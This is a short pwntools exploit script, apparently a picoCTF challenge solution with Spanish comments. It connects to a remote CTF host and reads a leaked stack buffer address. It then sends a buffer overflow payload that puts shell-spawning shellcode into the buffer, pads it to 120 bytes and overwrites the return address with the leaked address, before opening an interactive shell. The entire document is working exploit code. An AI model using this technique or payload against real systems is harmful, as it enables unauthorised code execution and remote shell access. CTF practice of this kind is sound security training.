from pwn import *

context.arch = "amd64"
context.os = "linux"

HOST = "wily-courier.picoctf.net"
PORT = 65399

io = remote(HOST, PORT)

# El binario imprime una dirección, por ejemplo: 0x7fffffffe...
leak = io.recvline().strip()
buf_addr = int(leak, 16)

log.info(f"buffer leak = {hex(buf_addr)}")

shellcode = asm(shellcraft.sh())

offset = 120
payload = shellcode.ljust(offset, b"A")
payload += p64(buf_addr)

# Primer input cualquiera
io.sendline(b"A")

# Segundo input: shellcode + padding + dirección filtrada
io.sendline(payload)

io.interactive()
